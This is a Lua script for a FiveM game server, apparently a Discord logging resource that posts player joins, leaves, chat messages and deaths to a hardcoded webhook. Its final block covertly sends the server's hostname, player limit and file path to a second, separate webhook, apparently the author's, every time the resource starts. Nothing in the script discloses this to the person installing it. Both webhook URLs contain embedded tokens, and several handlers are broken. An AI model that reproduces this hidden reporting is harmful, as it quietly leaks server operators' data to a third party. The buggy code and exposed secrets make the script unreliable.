----------------------------
-- Coded By Yrahmial#7579 --
----------------------------

local YM_WebHook = 'https://discordapp.com/api/webhooks/713970556629811230/zIB5n9G66leV-AWSJQLqfSFoSBPOKe8Etjl-dlenXSFPfl5p-A7mkutmj5QznCHp2QWb'
local YM_image = 'https://cdn.discordapp.com/attachments/713810142654627920/714112730285736027/fdg.png'
--local LogsName = 'YM_Logs | By Yrahmial'
local ym = message
local YM = playername
local time = os.date("%c")




--[[
%a	abbreviated weekday name (e.g., Wed)
%A	full weekday name (e.g., Wednesday)
%b	abbreviated month name (e.g., Sep)
%B	full month name (e.g., September)
%c	date and time (e.g., 09/16/98 23:48:10)
%d	day of the month (16) [01-31]
%H	hour, using a 24-hour clock (23) [00-23]
%I	hour, using a 12-hour clock (11) [01-12]
%M	minute (48) [00-59]
%m	month (09) [01-12]
%p	either "am" or "pm" (pm)
%S	second (10) [00-61]
%w	weekday (3) [0-6 = Sunday-Saturday]
%x	date (e.g., 09/16/98)
%X	time (e.g., 23:48:10)
%Y	full year (1998)
%y	two-digit year (98) [00-99]
%%	the character `%ֲ´
]]--


AddEventHandler('playerConnecting', function()
    sendToDiscord('[Player Connecting] \n' .. GetPlayerName(source) .. ' Connect to The Server.')
end)



AddEventHandler('playerDropped', function(reason) 
    sendToDiscord('[Player Logout] \n' .. GetPlayerName(source) .. ' Out From The Server. \n Reason: ' .. reason)
end)



AddEventHandler('chatMessage', function(source, YM, ym)
    sendToDiscord(YM, ym)
    PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = GetPlayerName(source), embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
end)



RegisterServerEvent('playerDied')
AddEventHandler('playerDied',function(ym)
    sendToDiscord('[Death log]', ym)
end)


--[[AddEventHandler('playerSpawned', function(source)
    sendToDiscord("Player Spawned" \n\n "**Spawned Successfully**")
end)]]--

AddEventHandler('onServerResourceStart', function(resource)
    if GetCurrentResourceName() == resource then
        sendToDiscord ('[Server Status] \n\n On')
        PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
    end
end)



AddEventHandler('onServerResourceStop', function(resource)
    if GetCurrentResourceName() == resource then
        sendToDiscord ('[Server Status] \n\n off')
        PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
    end
end)



function sendToDiscord(YM, ym, color)
    local connect = {
          {
              ['color'] = 123, 50, 254, -- here you can change the color!!
              ['title'] = '**'.. YM ..'**',
              ['description'] = ym,
              ['footer'] = {
              --['text'] = LogsName,
              ['text'] = time,
              },
          }
      }
  PerformHttpRequest(YM_WebHook, function(err, text, headers) end, 'POST', json.encode({username = 'YM_Logs | By Yrahmial', embeds = connect, avatar_url = YM_image}), { ['Content-Type'] = 'application/json' })
end


print ("YM Logs Resource start")
print (os.date ("%x %c"))

local YM_System = "https://discordapp.com/api/webhooks/716206916476338176/UZun8U1_wX18NsuBB0qZwgsL2SxP6GxN-1U10lKJHNMtV0KS3u85nPnCRhtuoUnwIyst"
local msg = "**@everyone YM_logs is in use**"
local systemtime = os.date("%Y/%m/%d %X")
AddEventHandler("onServerResourceStart", function(resource)
    if GetCurrentResourceName() == resource then
        local ServerName = GetConvar("sv_hostname")
        local client = GetConvar("sv_maxclients")
        local scriptOn = msg ..' **\n\nServer Name : ** ```' .. ServerName .. 'YM_Logs is in use ```  ** \n\n** **[Private Server Info]** \n ** Max Players :** ```' ..client.. '```\n\n  **time :  **\n```'.. systemtime ..  '```\n\n**Resource File :  ** ```\n'  ..GetResourcePath(GetCurrentResourceName()).. '``` \n ```System By Yrahmial```'
        PerformHttpRequest(YM_System, function(err, text, headers) end, 'POST', json.encode({username = "YM_Logs | System", content = scriptOn}), { ['Content-Type'] = 'application/json' })
    end
end)
